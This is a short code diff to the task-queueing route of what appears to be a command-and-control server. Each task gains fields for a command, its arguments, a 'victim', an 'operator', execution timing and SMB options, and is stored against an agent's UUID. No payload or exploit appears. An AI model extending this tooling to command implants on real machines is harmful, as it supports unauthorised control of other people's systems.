@@ -137,16 +137,40 @@ def task():
         jtask = jdata["task"]
         keys = jtask.keys()
     
-        if not was_given("file", keys) or \
+        if not was_given("command", keys) or \
         not was_given("args", keys) or \
-        not was_given("verbose", keys):
+        not was_given("victim", keys) or \
+        not was_given("operator", keys) or \
+        not was_given("delay", keys) or \
+        not was_given("execTime", keys) or \
+        not was_given("file", keys) or \
+        not was_given("usesmb", keys) or \
+        not was_given("actsmb", keys):
             return Transport("FAILED", "out")
-        file: str = jtask["file"]
-        args: list[str] = json.dumps(jtask["args"])
-        verbose: bool = jtask["verbose"]
+
+        command: str  = jtask["command"]
+        args: str     = jtask["args"]
+        victim: str   = jtask["victim"]
+        operator: str = jtask["operator"]
+        delay: int    = jtask["delay"]
+        execTime: int = jtask["execTime"]
+        file: str     = jtask["file"]
+        usesmb: str   = jtask["usesmb"]
+        actsmb: str   = jtask["actsmb"]
 
         agent_id = Agent.get_by_uuid(uuid).id
-        newTask = Task(file=file, args=args, verbose=verbose, agent_id=agent_id)
+        newTask = Task(
+            command=command,
+            args=args,
+            victim=victim,
+            operator=operator,
+            delay=delay,
+            execTime=execTime,
+            file=file,
+            usesmb=usesmb,
+            actsmb=actsmb, 
+            agent_id=agent_id
+        )
         db.session.add(newTask)
         db.session.commit()
 
@@ -163,8 +187,6 @@ def task():
             return Transport(task.jsonify(), "out")
         else:
             return Transport("NONE", "out")
-        
-        
 
 @service.route("/reply", methods = {"POST", "GET"})
 def reply():
